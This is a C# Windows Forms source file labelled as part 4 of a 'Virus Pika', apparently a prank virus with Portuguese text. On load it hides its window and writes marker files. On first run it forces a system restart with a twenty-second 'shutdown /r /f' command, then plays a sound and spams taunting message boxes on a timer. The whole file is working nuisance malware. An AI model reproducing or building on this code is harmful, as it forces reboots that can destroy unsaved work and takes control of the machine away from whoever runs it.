using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
//PARTE 04 + SPAM DE CAIXA DE MENSAGEM "BASEBALLBAT.VBS"
namespace Virus_Pika__By_Waguinho_
{
    public partial class VirusPika04 : Form
    {
        SoundPlayer oiamensagem;
        public VirusPika04()
        {
            InitializeComponent();
            oiamensagem = new SoundPlayer(@"C:\Program Files\temp\fiufiu.wav");
        }

        private void VirusPika04_Load(object sender, EventArgs e)
        {
            this.Hide();
            if (!File.Exists(@"C:\Program Files\Temp\CheckR.ini"))
            {
                File.Create(@"C:\Program Files\Temp\CheckR.ini");
                Process.Start("shutdown", "/r /f /t 20 /C \"BUMDA ( :\"");
                 
            }
            
            if (!File.Exists(@"c:\spam.ini"))
            {   
                File.Create(@"c:\spam.ini");
                oiamensagem.Play();
                spam.Start();

            }
           
        }

        private void spam_Tick(object sender, EventArgs e)
        {
            MessageBox.Show("APARENTEMENTE VOCÊ GOSTA DE UM BASEBALLBAT!", "WOOOW LOOK AT HIM!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
    }
}
